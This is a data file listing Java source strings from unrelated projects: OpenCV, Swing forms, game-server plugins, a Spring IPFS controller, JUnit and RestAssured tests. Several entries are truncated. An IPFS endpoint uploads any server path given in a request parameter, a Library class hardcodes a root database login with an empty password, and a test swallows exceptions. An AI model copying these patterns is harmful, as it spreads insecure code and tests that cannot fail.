    "package org.opencv.core;\n\nimport java.util.Arrays;\nimport java.util.List;\n\npublic class MatOfPoint3 extends Mat {\n    // 32SC3\n    private static final int _depth = CvType.CV_32S;\n    private static final int _channels = 3;\n\n    public MatOfPoint3() {\n        super();\n    }\n\n    protected MatOfPoint3(long addr) {\n        super(addr);\n        if( !empty() && checkVector(_channels, _depth) < 0 )\n            throw new IllegalArgumentException(\"Incompatible Mat\");\n        //FIXME: do we need release() here?\n    }\n\n    public static MatOfPoint3 fromNativeAddr(long addr) {\n        return new MatOfPoint3(addr);\n    }\n\n    public MatOfPoint3(Mat m) {\n        super(m, Range.all());\n        if( !empty() && checkVector(_channels, _depth) < 0 )\n            throw new IllegalArgumentException(\"Incompatible Mat\");\n        //FIXME: do we need release() here?\n    }\n\n    public MatOfPoint3(Point3...a) {\n        super();\n        fromArray(a);\n    }\n\n    public void alloc(int elemNumber) {\n        if(elemNumber>0)\n            super.create(elemNumber, 1, CvType.makeType(_depth, _channels));\n    }\n\n    public void fromArray(Point3...a) {\n        if(a==null || a.length==0)\n            return;\n        int num = a.length;\n        alloc(num);\n        int buff[] = new int[num * _channels];\n        for(int i=0; i<num; i++) {\n            Point3 p = a[i];\n            buff[_channels*i+0] = (int) p.x;\n            buff[_channels*i+1] = (int) p.y;\n            buff[_channels*i+2] = (int) p.z;\n        }\n        put(0, 0, buff); //TODO: check ret val!\n    }\n\n    public Point3[] toArray() {\n        int num = (int) total();\n        Point3[] ap = new Point3[num];\n        if(num == 0)\n            return ap;\n        int buff[] = new int[num * _channels];\n        get(0, 0, buff); //TODO: check ret val!\n        for(int i=0; i<num; i++)\n            ap[i] = new Point3(buff[i*_channels], buff[i*_channels+1], buff[i*_channels+2]);\n        return ap;\n    }\n\n    public void fromList(List<Point3> lp) {\n        Point3 ap[] = lp.toArray(new Point3[0]);\n        fromArray(ap);\n    }\n\n    public List<Point3> toList() {\n        Point3[] ap = toArray();\n        return Arrays.asList(ap);\n    }\n}\n",
    "package ordersystem;\r\n\r\nimport javax.swing.*;\r\nimport java.awt.*;\r\nimport java.awt.event.ActionEvent;\r\nimport java.awt.event.ActionListener;\r\nimport java.sql.Connection;\r\nimport java.sql.PreparedStatement;\r\nimport java.sql.ResultSet;\r\nimport java.sql.SQLException;\r\nimport javax.swing.border.LineBorder;\r\nimport javax.swing.border.TitledBorder;\r\n\r\npublic class SignInForm extends JFrame {\r\n\r\n    private JTextField idField;\r\n    private JTextField nameField;\r\n    private JPasswordField passwordField;\r\n\r\n    public SignInForm() {\r\n    \tsetUndecorated(true);\r\n        getContentPane().setBackground(new Color(0, 0, 55));\r\n        setTitle(\"Sign In\");\r\n        setSize(1654, 820);\r\n        setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);\r\n\r\n        initializeComponents();\r\n    }\r\n\r\n    private void initializeComponents() {\r\n        Container container = getContentPane();\r\n        getContentPane().setLayout(null);\r\n        \r\n        JPanel panel = new JPanel();\r\n        panel.setForeground(new Color(0, 0, 64));\r\n        panel.setFont(new Font(\"Tahoma\", Font.PLAIN, 20));\r\n        panel.setBorder(new LineBorder(new Color(255, 128, 0), 10));\r\n        panel.setBackground(new Color(252, 251, 244));\r\n        panel.setBounds(-13, 70, 1721, 644);\r\n        getContentPane().add(panel);\r\n        panel.setLayout(null);\r\n                                \r\n                                        JLabel lblName = new JLabel(\"Name:\");\r\n                                        lblName.setBounds(677, 258, 30, 13);\r\n                                        panel.add(lblName);\r\n                                                                \r\n                                                                        passwordField = new JPasswordField(15);\r\n                                                                        passwordField.setBorder(new LineBorder(new Color(0, 0, 64), 2));\r\n                                                                        passwordField.setBounds(504, 188, 233, 39);\r\n                                                                        panel.add(passwordField);\r\n                                                                                \r\n                                                                                JPanel panel_1 = new JPanel();\r\n                                                                                panel_1.setBounds(902, 30, 588, 585);\r\n                                                                                panel.add(panel_1);\r\n                                                                                panel_1.setLayout(null);\r\n                                                                                \r\n                                                                                JLabel lblNewLabel = new JLabel(\"     LOGIN\");\r\n                                                                                lblNewLabel.setBounds(209, 24, 113, 39);\r\n                                                                                panel_1.add(lblNewLabel);\r\n                                                                                lblNewLabel.setForeground(new Color(0, 0, 64));\r\n                                                                                lblNewLabel.setFont(new Font(\"Arial Rounded MT Bold\", Font.BOLD, 20));\r\n                                                                                \r\n                                                                                        JButton signInButton = new JButton(\"LOGIN\");\r\n                                                                                        signInButton.setBounds(197, 381, 171, 45);\r\n                                                                                        panel_1.add(signInButton);\r\n                                                                                        signInButton.setForeground(new Color(0, 0, 64));\r\n                                                                                        signInButton.setBackground(new Color(255, 128, 0));\r\n                                                                                        signInButton.setFont(new Font(\"Arial Rounded MT Bold\", Font.PLAIN, 13));\r\n                                                                                        \r\n                                                                                                nameField = new JTextField(15);\r\n                                                                                                nameField.setBounds(164, 310, 233, 39);\r\n                                                                                                panel_1.add(nameField);\r\n                                                                                                nameField.setBorder(new LineBorder(new Color(0, 0, 64), 2));\r\n                                                                                                \r\n                ",
    "package com.aetherteam.treasurereforging.data.generators;\n\nimport com.aetherteam.treasurereforging.data.providers.ReforgingLanguageProvider;\nimport com.aetherteam.treasurereforging.item.ReforgingItems;\nimport net.minecraft.data.PackOutput;\n\npublic class ReforgingLanguageData extends ReforgingLanguageProvider {\n    public ReforgingLanguageData(PackOutput output) {\n        super(output);\n    }\n\n    @Override\n    protected void addTranslations() {\n        this.addItem(ReforgingItems.NEPTUNE_MESH, \"Neptune Mesh\");\n        this.addItem(ReforgingItems.VALKYRUM_INGOT, \"Valkyrum Ingot\");\n        this.addItem(ReforgingItems.PYRAL_INGOT, \"Pyral Ingot\");\n\n        this.addTrim(\"neptune\", \"Neptune\");\n        this.addTrim(\"valkyrie\", \"Valkyrie\");\n        this.addTrim(\"phoenix\", \"Phoenix\");\n\n        this.addUpgrade(\"neptune_upgrade\", \"Neptune Upgrade\");\n        this.addSmithingTemplateDescription(\"neptune_upgrade\", \"additions_slot_description\", \"Add Neptune Mesh\");\n        this.addSmithingTemplateDescription(\"neptune_upgrade\", \"applies_to\", \"Zanite Armor\");\n        this.addSmithingTemplateDescription(\"neptune_upgrade\", \"base_slot_description\", \"Add a piece of zanite armor\");\n        this.addSmithingTemplateDescription(\"neptune_upgrade\", \"ingredients\", \"Neptune Mesh\");\n\n        this.addUpgrade(\"valkyrie_upgrade\", \"Valkyrie Upgrade\");\n        this.addSmithingTemplateDescription(\"valkyrie_upgrade\", \"additions_slot_description\", \"Add Valkyrum Ingot\");\n        this.addSmithingTemplateDescription(\"valkyrie_upgrade\", \"applies_to\", \"Gravitite Equipment\");\n        this.addSmithingTemplateDescription(\"valkyrie_upgrade\", \"base_slot_description\", \"Add gravitite armor, weapon, or tool\");\n        this.addSmithingTemplateDescription(\"valkyrie_upgrade\", \"ingredients\", \"Valkyrum Ingot\");\n\n        this.addUpgrade(\"phoenix_upgrade\", \"Phoenix Upgrade\");\n        this.addSmithingTemplateDescription(\"phoenix_upgrade\", \"additions_slot_description\", \"Add Pyral Ingot\");\n        this.addSmithingTemplateDescription(\"phoenix_upgrade\", \"applies_to\", \"Gravitite Armor\");\n        this.addSmithingTemplateDescription(\"phoenix_upgrade\", \"base_slot_description\", \"Add a piece of gravitite armor\");\n        this.addSmithingTemplateDescription(\"phoenix_upgrade\", \"ingredients\", \"Pyral Ingot\");\n\n        this.addPackDescription(\"mod\", \"The Aether: Treasure Reforging Resources\");\n    }\n}\n",
    "package de.funfried.maven.plugin.zonky;\n\nimport org.apache.maven.plugin.AbstractMojo;\nimport org.apache.maven.plugin.MojoExecutionException;\nimport org.apache.maven.plugins.annotations.LifecyclePhase;\nimport org.apache.maven.plugins.annotations.Mojo;\nimport org.apache.maven.plugins.annotations.Parameter;\nimport org.apache.maven.project.MavenProject;\n\nimport de.funfried.maven.plugin.zonky.utils.ZonkyUtil;\nimport io.zonky.test.db.postgres.embedded.EmbeddedPostgres;\n\n/**\n * Goal which stops the embedded postgres database.\n */\n@Mojo(name = \"stop\", defaultPhase = LifecyclePhase.NONE)\npublic class StopEmbeddedPostgresMojo extends AbstractMojo {\n\t/**\n\t * The maven project.\n\t */\n\t@Parameter(defaultValue = \"${project}\", required = true, readonly = true)\n\tprivate MavenProject project;\n\n\t@Override\n\tpublic void execute() throws MojoExecutionException {\n\t\tObject obj = project.getProperties().get(\"zonky\");\n\t\tif (obj != null && obj instanceof EmbeddedPostgres) {\n\t\t\tEmbeddedPostgres pg = (EmbeddedPostgres) obj;\n\n\t\t\tZonkyUtil.stop(pg);\n\t\t}\n\t}\n}\n",
    "// Clase que representa a un cliente\npublic class Cliente {\n\n    // Atributos de la clase \"Cliente\"\n    private String nombre;    \n    private String Cedula;\n    private String fecha;\n    private Nivel_Ingresos nivel_ingresos;\n    private int ahorro; \n\n\n    // Constructor de la clase \"Cliente\" con par\u00e1metros\n    public Cliente(String nombre, String cedula, String fecha, Nivel_Ingresos nivel_ingresos, int ahorro) {\n        this.nombre = nombre;\n        this.Cedula = cedula;\n        this.fecha = fecha;\n        this.nivel_ingresos = nivel_ingresos;\n        this.ahorro = ahorro;\n    }\n\n    // Constructor de la clase Cliente sin par\u00e1metros\n    public Cliente() {\n    }\n\n    // M\u00e9todo getter para obtener el nombre del cliente\n    public String getNombre() {\n        return nombre;\n    }\n\n    // M\u00e9todo setter para establecer el nombre del cliente\n    public void setNombre(String nombre) {\n        this.nombre = nombre;\n    }\n\n    // M\u00e9todo getter para obtener la c\u00e9dula del cliente\n    public String getCedula() {\n        return Cedula;\n    }\n\n    // M\u00e9todo setter para establecer la c\u00e9dula del cliente\n    public void setCedula(String cedula) {\n        Cedula = cedula;\n    }\n\n    // M\u00e9todo getter para obtener la fecha de incorporaci\u00f3n del cliente\n    public String getFecha() {\n        return fecha;\n    }\n\n    // M\u00e9todo setter para establecer la fecha de incorporaci\u00f3n del cliente\n    public void setFecha(String fecha) {\n        this.fecha = fecha;\n    }\n\n    // M\u00e9todo getter para obtener el nivel de ingresos del cliente\n    public Nivel_Ingresos getNivel_ingresos() {\n        return nivel_ingresos;\n    }\n\n    // M\u00e9todo setter para establecer el nivel de ingresos del cliente\n    public void setNivel_ingresos(Nivel_Ingresos nivel_ingresos) {\n        this.nivel_ingresos = nivel_ingresos;\n    }\n\n    // M\u00e9todo getter para obtener el ahorro del cliente\n    public int getAhorro() {\n        return ahorro;\n    }\n\n    // M\u00e9todo setter para establecer el ahorro del cliente\n    public void setAhorro(int ahorro) {\n        this.ahorro = ahorro;\n    }\n}\n\n",
    "package net.pandadev.vitelist;\n\nimport com.google.inject.Inject;\nimport com.velocitypowered.api.command.CommandManager;\nimport com.velocitypowered.api.event.Subscribe;\nimport com.velocitypowered.api.event.connection.PostLoginEvent;\nimport com.velocitypowered.api.event.proxy.ProxyInitializeEvent;\nimport com.velocitypowered.api.plugin.Plugin;\nimport com.velocitypowered.api.plugin.annotation.DataDirectory;\nimport com.velocitypowered.api.proxy.Player;\nimport com.velocitypowered.api.proxy.ProxyServer;\nimport net.kyori.adventure.text.Component;\nimport org.slf4j.Logger;\nimport org.spongepowered.configurate.ConfigurateException;\nimport org.spongepowered.configurate.yaml.YamlConfigurationLoader;\n\nimport java.nio.file.Path;\nimport java.util.List;\n\n@Plugin(\n        id = \"vitelist\",\n        name = \"Main\",\n        version = \"1.0\",\n        description = \"A simple but useful whitelist plugin for Velocity\",\n        url = \"https://pandadev.net\",\n        authors = {\"PandaDEV\"}\n)\npublic class Main {\n\n    public static String prefix = \"\u00a7d\u00a7lVitelist \u00a78\u00bb \";\n    @Inject\n    private Logger logger;\n    @Inject\n    private ProxyServer server;\n    @Inject\n    @DataDirectory\n    private Path dataDirectory;\n    private YamlConfigurationLoader loader;\n    private boolean whitelistEnabled = true;\n\n    @Subscribe\n    public void onProxyInitialization(ProxyInitializeEvent event) {\n        loader = YamlConfigurationLoader.builder().path(dataDirectory.resolve(\"config.yml\")).build();\n        try {\n            var root = loader.load();\n            if (!root.node(\"whitelisted-uuids\").virtual()) {\n                whitelistEnabled = root.node(\"whitelist-enabled\").getBoolean(true);\n            } else {\n                root.node(\"whitelisted-uuids\").set(List.of());\n                root.node(\"whitelist-enabled\").set(true);\n                loader.save(root);\n            }\n        } catch (ConfigurateException e) {\n            logger.error(\"Failed to load/create config file\", e);\n        }\n\n        CommandManager commandManager = server.getCommandManager();\n        commandManager.register(commandManager.metaBuilder(\"vlist\").build(), new VlistCommand(this));\n    }\n\n    @Subscribe\n    public void onPlayerJoin(PostLoginEvent event) {\n        if (!whitelistEnabled) return;\n        Player player = event.getPlayer();\n        try {\n            var root = loader.load();\n            List<String> whitelistedUuids = root.node(\"whitelisted-uuids\").getList(String.class);\n            if (!whitelistedUuids.contains(player.getUniqueId().toString())) {\n                player.disconnect(Component.text(\"You are not whitelisted on this server.\"));\n            }\n        } catch (ConfigurateException e) {\n            logger.error(\"Failed to check whitelist\", e);\n        }\n    }\n\n    public YamlConfigurationLoader getLoader() {\n        return loader;\n    }\n\n    public void setWhitelistEnabled(boolean whitelistEnabled) {\n        this.whitelistEnabled = whitelistEnabled;\n    }\n\n    public static String getPrefix() {\n        return prefix;\n    }\n}",
    "package com.xssssss.xskeepfoodsaturation.utils;\n\nimport com.xssssss.xskeepfoodsaturation.XsKeepFoodSaturation;\n\nimport java.util.List;\nimport java.util.logging.Logger;\n\npublic class utils {\n    private final Logger logger = Logger.getLogger(\"utils\");\n    private final XsKeepFoodSaturation main;\n    public utils(XsKeepFoodSaturation main) {\n        this.main = main;\n    }\n    public boolean isEnableWorld(String mode, String world){\n        List<String> worldlist = (List<String>)main.config.get(\"enableWorlds.list\");\n        if (!(mode.equalsIgnoreCase(\"ALL\") || mode.equalsIgnoreCase(\"WHITELIST\") || mode.equalsIgnoreCase(\"BLACKLIST\"))) {\n            logger.warning(\"[XsKeepFoodSaturation] config.yml\u4e2d\u7684\\\"enableWorlds.mode\\\"\u53ea\u80fd\u4e3a\\\"ALL/WHITELIST/BLACKLIST\\\"\uff0c\u5df2\u542f\u7528\u9ed8\u8ba4\u6a21\u5f0f\\\"ALL\\\"\uff01\");\n            mode = \"ALL\";\n        }\n        switch (mode){\n            case \"ALL\":\n                return true;\n            case \"WHITELIST\":\n                if (worldlist.contains(world)) {\n                    return true;\n                }else { return false; }\n            case \"BLACKLIST\":\n                if (worldlist.contains(world)) {\n                    return false;\n                }else { return true; }\n        }\n        return true;\n    }\n}\n",
    "package edu.pitt.cs;\n\nimport org.junit.After;\nimport org.junit.Before;\nimport org.junit.Test;\nimport org.junit.FixMethodOrder;\nimport org.junit.runners.MethodSorters;\nimport static org.junit.Assert.*;\n\nimport org.mockito.Mockito;\nimport static org.mockito.Mockito.*;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.PrintStream;\nimport java.lang.reflect.Method;\n\n@FixMethodOrder(MethodSorters.NAME_ASCENDING)\npublic class RentACatIntegrationTest {\n\n\t/**\n\t * The test fixture for this JUnit test. Test fixture: a fixed state of a set of\n\t * objects used as a baseline for running tests. The test fixture is initialized\n\t * using the @Before setUp method which runs before every test case. The test\n\t * fixture is removed using the @After tearDown method which runs after each\n\t * test case.\n\t */\n\n\tRentACat r; // Object to test\n\tCat c1; // First cat object\n\tCat c2; // Second cat object\n\tCat c3; // Third cat object\n\n\tByteArrayOutputStream out; // Output stream for testing system output\n\tPrintStream stdout; // Print stream to hold the original stdout stream\n\tString newline = System.lineSeparator(); // Platform independent newline (\"\\n\" or \"\\r\\n\") for use in assertEquals\n\n\t@Before\n\tpublic void setUp() throws Exception {\n\t\t// INITIALIZE THE TEST FIXTURE\n\n\t\t// 1. Create a new RentACat object and assign to r using a call to RentACat.createInstance(InstanceType).\n\t\t// Passing InstanceType.IMPL as the first parameter will create a real RentACat object using your RentACatImpl implementation.\n\t\t// Passing InstanceType.MOCK as the first parameter will create a mock RentACat object using Mockito.\n\t\t// Which type is the correct choice for this integration test?  I'll leave it up to you.  The answer is in the Unit Testing Part 2 lecture. :)\n\t\t// TODO: Fill in\n\t\tr = RentACat.createInstance(InstanceType.IMPL);\n\n\t\t// 2. Create a Cat with ID 1 and name \"Jennyanydots\", assign to c1 using a call to Cat.createInstance(InstanceType, int, String).\n\t\t// Passing InstanceType.IMPL as the first parameter will create a real cat using your CatImpl implementation.\n\t\t// Passing InstanceType.MOCK as the first parameter will create a mock cat using Mockito.\n\t\t// Which type is the correct choice for this integration test?  Again, I'll leave it up to you.\n\t\t// TODO: Fill in\n\t\tc1 = Cat.createInstance(InstanceType.IMPL, 1, \"Jennyanydots\");\n\t\t// 3. Create a Cat with ID 2 and name \"Old Deuteronomy\", assign to c2 using a call to Cat.createInstance(InstanceType, int, String).\n\t\t// TODO: Fill in\n\t\tc2 = Cat.createInstance(InstanceType.IMPL, 2, \"Old Deuteronomy\");\n\n\t\t// 4. Create a Cat with ID 3 and name \"Mistoffelees\", assign to c3 using a call to Cat.createInstance(InstanceType, int, String).\n\t\t// TODO: Fill in\n\t\tc3 = Cat.createInstance(InstanceType.IMPL, 3, \"Mistoffelees\");\n\n\t\t// 5. Redirect system output from stdout to the \"out\" stream\n\t\t// First, make a back up of System.out (which is the stdout to the console)\n\t\tstdout = System.out;\n\t\t// Second, update System.out to the PrintStream created from \"out\"\n\t\t// TODO: Fill in.  Refer to the textbook chapter 14.6 on Testing System Output.\n\t\tout = new ByteArrayOutputStream();\n\t}\n\n\t@After\n\tpublic void tearDown() throws Exception {\n\t\t// Restore System.out to the original stdout\n\t\tSystem.setOut(stdout);\n\n\t\t// Not necessary strictly speaking since the references will be overwritten in\n\t\t// the next setUp call anyway and Java has automatic garbage collection.\n\t\tr = null;\n\t\tc1 = null;\n\t\tc2 = null;\n\t\tc3 = null;\n\t}\n\n\t/**\n\t * Test case for Cat getCat(int id).\n\t * \n\t * <pre>\n\t * Preconditions: r has no cats.\n\t * Execution steps: Call getCat(2).\n\t * Postconditions: Return value is null.\n\t *                 System output is \"Invalid cat ID.\" + newline.\n\t * </pre>\n\t * \n\t * Hint: You will need to use Java reflection to invoke the private getCat(int)\n\t * method. efer to the Unit Testing Part 1 lecture and the textbook appendix \n\t * hapter on using reflection on how to do this.  Please use r.getClass() to get\n\t * the class object of r instead of hardcoding it as RentACatImpl.\n\t */\n\t@Test\n\tpublic void testGetCatNullNumCats0() {\n\t\t// TODO: Fill in\n\t\ttry {\n\t\t\tMethod cl = r.getClass().getDeclaredMethod(\"getCat\", int.class);\n\t\t\tcl.setAccessible(true);\n\t\t\tObject retVal = cl.invoke(r, 2);\n\t\t\tassertNull(retVal);\n\t\t} catch (Exception e) {\n\t\t\te.getMessage();\n\t\t}\n\t}\n\n\t/**\n\t * Test case for Cat getCat(int id).\n\t * \n\t * <pre>\n\t * Preconditions: c1, c2, and c3 are added to r using addCat(Cat c).\n\t * Execution steps: Call getCat(2).\n\t * Postconditions: Return value is not null.\n\t *                 Returned cat has an ID of 2.\n\t * </pre>\n\t * \n\t * Hint: You will need to use Java reflection to invoke the private getCat(int)\n\t * method. efer to the Unit Testing Part 1 lecture and the textbook appendix \n\t * hapter on using reflection on how to do this.  Please use r.getClass() to get\n\t * the class object of r instead of hardcoding it as RentACatImpl.\n\t */\n\t@Test\n\tpublic void testGetCatNumCats3() {\n\n\t\t// TODO: Fill in\n\t\tr.addCat(c1);\n\t\tr.addCat(c2",
    "package com.example.ipfsdemon;\n\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.http.HttpHeaders;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.MediaType;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.*;\nimport org.springframework.web.multipart.MultipartFile;\n\n@RestController\npublic class IPFSController {\n\n\n    @Autowired\n    private IPFSService ipfsService;\n\n    @GetMapping(value = \"\")\n    public String saveText(@RequestParam(\"filepath\") String filepath) {\n        return ipfsService.saveFile(filepath);\n    }\n\n    @PostMapping(value = \"upload\")\n    public String uploadFile(@RequestParam(\"file\") MultipartFile file)\n    {\n        System.out.println(\"Received request for file upload\");\n        return ipfsService.saveFile(file);\n    }\n\n    @GetMapping(value = \"file/{hash}\")\n    public ResponseEntity<byte[]> getFile(@PathVariable(\"hash\") String hash) {\n        HttpHeaders headers = new HttpHeaders();\n        headers.set(\"Content-type\", MediaType.ALL_VALUE);\n        byte[] bytes = ipfsService.loadFile(hash);\n        return ResponseEntity.status(HttpStatus.OK).headers(headers).body(bytes);\n\n    }\n\n}\n",
    "package system;\r\nimport javax.swing.*;\r\nimport javax.swing.border.EmptyBorder;\r\nimport javax.swing.event.DocumentEvent;\r\nimport javax.swing.event.DocumentListener;\r\nimport javax.swing.event.ListSelectionEvent;\r\nimport javax.swing.event.ListSelectionListener;\r\nimport javax.swing.table.DefaultTableModel;\r\nimport javax.swing.table.JTableHeader;\r\n\r\nimport java.awt.*;\r\nimport java.sql.*;\r\nimport java.text.SimpleDateFormat;\r\nimport java.util.ArrayList;\r\nimport java.util.Calendar;\r\nimport java.util.GregorianCalendar;\r\nimport java.awt.event.KeyAdapter;\r\nimport java.awt.event.KeyEvent;\r\nimport javax.swing.border.CompoundBorder;\r\nimport javax.swing.border.BevelBorder;\r\nimport javax.swing.border.MatteBorder;\r\nimport javax.swing.border.EtchedBorder;\r\nimport java.awt.event.ActionListener;\r\nimport java.awt.event.ActionEvent;\r\nimport javax.swing.border.LineBorder;\r\nimport com.toedter.calendar.JDateChooser;\r\nimport java.util.Date;\r\nimport javax.swing.event.ChangeListener;\r\nimport javax.swing.event.ChangeEvent;\r\nimport java.util.List;\r\nimport java.awt.event.MouseAdapter;\r\nimport java.awt.event.MouseEvent;\r\n\r\n\r\n\r\npublic class Library extends JFrame {\r\n   \tprivate static final long serialVersionUID = 1L;\r\n\tprivate static final String JDBC_URL = \"jdbc:mysql://localhost:3306/librasystem\";\r\n    private static final String USER = \"root\";\r\n    private static final String PASSWORD = \"\";\r\n    private JPanel manageBookPanel, manageStudentPanel;\r\n    private JTextField bookIdField, bookNameField, authorField;\r\n    private JSpinner quantitySpinner;\r\n    private JButton addBookButton;\r\n    private JTable addbooktable;\r\n    private JTextField studentIdField, studentNameField;\r\n    private JComboBox<String> courseComboBox, branchComboBox;\r\n    private JButton addStudentButton;\r\n    private JTable studentTable;\r\n\tprivate JPanel issueBookPanel;\r\n\tprivate JTextField issueBookIdField;\r\n\tprivate JTextField issueStudentIdField;\r\n\tprivate JButton issueBookButton;\r\n\tprivate JLabel bookIdLabel, bookNameLabel,  authorLabel;\r\n\tprivate JPanel bookDetailsPanel_1;\r\n\tprivate JPanel studentDetailsPanel;\r\n\tprivate JLabel studentIdLabel;\r\n\tprivate JLabel studentNameLabel;\r\n\tprivate JLabel courseLabel;\r\n\tprivate JLabel branchLabel;\r\n\tprivate JTextField returnBookIdField;\r\n\tprivate JTextField returnStudentIdField;\r\n\tprivate JButton returnfindButton;\r\n\tprivate JButton returnBookButton;\r\n\tprivate JPanel returnbookPanel;\r\n\tprivate JLabel returnissueIdLabel;\r\n\tprivate JLabel returnbooknameLabel;\r\n\tprivate JLabel returnstudentnameLabel;\r\n\tprivate JLabel returnissuedateLabel;\r\n\tprivate JLabel returnduedateLabel;\r\n\tprivate JPanel DashboardPanel;\r\n\tprivate JLabel numberofbookslabel;\r\n\tprivate JLabel numberofstudentslabel;\r\n\tprivate JLabel numberofissuedbookslabel;\r\n\tprivate JLabel numberOfBooksLabel;\r\n\tprivate JLabel numberOfIssuedBooksLabel;\r\n\tprivate JPanel contentPane;\r\n\tprivate JPanel panel_2;\r\n\tprivate JLabel timelabel;\r\n\tprivate JLabel datelabel;\r\n\tprivate JPanel panel;\r\n\tprivate JLabel openorcloselabel;\r\n\tprivate JLabel lblNewLabel_5;\r\n\tprivate JLabel lblNewLabel_2_1;\r\n\tprivate JLabel lblNewLabel_7;\r\n\tprivate JPanel HomePanel;\r\n\tprivate JPanel viewrecordsPanel;\r\n\tprivate JPanel viewissuedbooksPanel;\r\n\tprivate JLabel lblNewLabel_8;\r\n\tprivate JTable dashboardbook;\r\n\tprivate JTable dashboardstudenttable;\r\n\tprivate JPanel panel_4;\r\n\tprivate JPanel panel_5;\r\n\tprivate JPanel panel_1;\r\n\tprivate JLabel lblNewLabel_10;\r\n\tprivate JPanel panel_6;\r\n\tprivate JLabel lblNewLabel_15;\r\n\tprivate JLabel lblNewLabel_19;\r\n\tprivate JLabel lblNewLabel_20;\r\n\tprivate JPanel panel_7;\r\n\tprivate JButton clearButton;\r\n\tprivate JButton updatebutton;\r\n\tprivate JLabel lblNewLabel_21;\r\n\tprivate JLabel lblNewLabel_22;\r\n\tprivate JLabel lblNewLabel_23;\r\n\tprivate JLabel lblNewLabel_24;\r\n\tprivate JLabel label_4;\r\n\tprivate JLabel label_5;\r\n\tprivate JLabel label_6;\r\n\tprivate JLabel lblNewLabel_19_5;\r\n\tprivate JLabel lblNewLabel_19_6;\r\n\tprivate JLabel lblNewLabel_19_7;\r\n\tprivate JLabel returnbooknameLabel_1;\r\n\tprivate JLabel returnbooknameLabel_2;\r\n\tprivate JTable issuedBooksTable;\r\n\tprivate JScrollPane scrollPane_2;\r\n\tprivate JDateChooser issuedate;\r\n\tprivate JDateChooser duedate;\r\n\tprivate JDateChooser searchIssueDateChooser;\r\n\tprivate JDateChooser searchDueDateChooser;\r\n\tprivate JTable table_2;\r\n\tprivate JLabel lblNewLabel_26;\r\n\tprivate JPanel searchbookpanel;\r\n\tprivate JScrollPane scrollPane_3;\r\n\tprivate JTable searchtable;\r\n\tprivate boolean searchPerformed = false;\r\n\tprivate JScrollPane scrollPane_4;\r\n\tprivate JTextField textField;\r\n\tprivate JLabel numberofbooksquantitylabel;\r\n\tprivate JButton btnNewButton_2;\r\n\tpublic static void main(String[] args) {\r\n\t        EventQueue.invokeLater(new Runnable() {\r\n\t            public void run() {\r\n\t                try {\r\n\t                    // Load the JDBC driver\r\n\t                    Class.forName(\"com.mysql.cj.jdbc.Driver\");\r\n\t                } catch (ClassNotFoundException e) {\r\n\t                    e.printStackTrace();\r\n\t                    JOptionPan",
    "package org.wiremock.extension.jwt;\n\nimport com.github.jknack.handlebars.Options;\nimport com.github.tomakehurst.wiremock.extension.responsetemplating.helpers.HandlebarsHelper;\nimport java.io.IOException;\nimport org.jose4j.jwk.JsonWebKey;\nimport org.jose4j.jwk.JsonWebKeySet;\nimport org.jose4j.lang.JoseException;\n\npublic class JwksHandlebarsHelper extends HandlebarsHelper<Object> {\n\n    private final JwtSigningKeySettings jwtSigningKeySettings;\n\n    public JwksHandlebarsHelper(JwtSigningKeySettings jwtSigningKeySettings) {\n        this.jwtSigningKeySettings = jwtSigningKeySettings;\n    }\n\n    @Override\n    public Object apply(Object context, Options options) throws IOException {\n        try {\n            JsonWebKey jsonWebKey = JsonWebKey.Factory.newJwk(jwtSigningKeySettings.getKeyPair().publicKey);\n            jsonWebKey.setAlgorithm(\"RS256\");\n            jsonWebKey.setUse(\"sig\");\n            jsonWebKey.setKeyId(jwtSigningKeySettings.getRs256PublicKeyId());\n            JsonWebKeySet jsonWebKeySet = new JsonWebKeySet(jsonWebKey);\n            return jsonWebKeySet.toJson();\n        } catch (JoseException e) {\n            throw new IOException(e);\n        }\n    }\n\n}\n",
    "import org.junit.jupiter.api.Test;\n\nimport static io.restassured.RestAssured.get;\nimport static io.restassured.RestAssured.given;\nimport static io.restassured.http.ContentType.JSON;\nimport static org.hamcrest.Matchers.is;\n\npublic class ReqresTests {\n\n    @BeforeAll\n    static void beforeAll() {\n    RestAssured.baseURI = \"https://reqres.in\";\n    }\n    \n    @Test\n    void successfulLoginTest() {\n        String authData = \"{\\\"email\\\": \\\"peter@klaven\\\"}\";\n\n        given()\n                .body(authData)\n                .contentType(JSON)\n                .log().uri()\n                .when()\n                .post(\"/api/login\")\n                .then()\n                .log().status()\n                .log().body()\n                .statusCode(400)\n                .body(\"error\", is(\"Missing password\"));\n    }\n\n    @Test\n    void successfullCreateUserTest() {\n        String authData = \"{\\\"name\\\": \\\"Alex\\\", \\\"job\\\": \\\"student\\\"}\";\n\n        given()\n                .body(authData)\n                .contentType(JSON)\n                .log().uri()\n                .when()\n                .post(\"/api/users\")\n                .then()\n                .log().status()\n                .log().body()\n                .statusCode(201)\n                .body(\"name\", is(\"Alex\"))\n                .body(\"job\", is(\"student\"));\n    }\n\n    @Test\n    void successfullCreateUserWithIdTest() {\n        String authData = \"{\\\"name\\\": \\\"Alex\\\", \\\"job\\\": \\\"student\\\", \\\"id\\\": \\\"111\\\"}\";\n\n        given()\n                .body(authData)\n                .contentType(JSON)\n                .log().uri()\n                .when()\n                .post(\"/api/users\")\n                .then()\n                .log().status()\n                .log().body()\n                .statusCode(201)\n                .body(\"name\", is(\"Alex\"))\n                .body(\"job\", is(\"student\"))\n                .body(\"id\", is(\"111\"));\n    }\n\n    @Test\n    void successfullUpdateUserNameWithPutTest() {\n        String authData = \"{\\\"job\\\": \\\"student\\\"}\";\n\n        given()\n                .body(authData)\n                .contentType(JSON)\n                .log().uri()\n                .when()\n                .put(\"/api/users/2\")\n                .then()\n                .log().status()\n                .log().body()\n                .statusCode(200)\n                .body(\"job\", is(\"student\"));\n    }\n\n    @Test\n    void successfullUpdateUserJobWithPatchTest() {\n        String authData = \"{\\\"name\\\": \\\"Alex\\\"}\";\n\n        given()\n                .body(authData)\n                .contentType(JSON)\n                .log().uri()\n                .when()\n                .patch(\"/api/users/2\")\n                .then()\n                .log().status()\n                .log().body()\n                .statusCode(200)\n                .body(\"name\", is(\"Alex\"));\n    }\n\n    @Test\n    void deleteUserTest() {\n        \n        given()\n                .log().uri()\n                .when()\n                .delete(\"/api/users/2\")\n                .then()\n                .log().status()\n                .statusCode(204);\n    }\n}\n",
